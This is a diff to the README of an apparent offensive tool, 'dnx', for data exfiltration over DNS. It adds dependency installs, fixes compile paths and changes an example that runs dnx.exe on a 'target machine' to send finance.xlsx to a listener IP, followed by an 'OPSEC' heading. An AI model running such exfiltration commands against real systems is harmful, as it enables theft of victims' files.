@@ -2,10 +2,16 @@
 Data exfiltration over DNS
 
 ### Compile
+install the dependencies
+```
+nimble install ndns
+nimble install zippy
+```
+
 Nim is cross compilation, compile according to your platform (e.g for Windows x64):
 ```
-nim c -d:mingw -d:release --app:console --opt:size --cpu:amd64 .\dnx.nim
-nim c -d:mingw -d:release --app:console --opt:size --cpu:amd64 .\dnxsvr.nim
+nim c -d:mingw -d:release --app:console --opt:size --cpu:amd64 ./dnx.nim
+nim c -d:mingw -d:release --app:console --opt:size --cpu:amd64 ./dnxsvr.nim
 ```
 
 ### Instructions
@@ -20,7 +26,7 @@ Run dnx on the target machine:
 [!] Use: dnx.exe <IP> <File> <Time between requests in ms>
 [!] e.g: dnx.exe 127.0.0.1 file.pdf 1000
 
-.\dnx.exe 192.168.0.100 fin.pdf 500
+.\dnx.exe 192.168.0.100 finance.xlsx 500
 ```
 
 OPSEC:
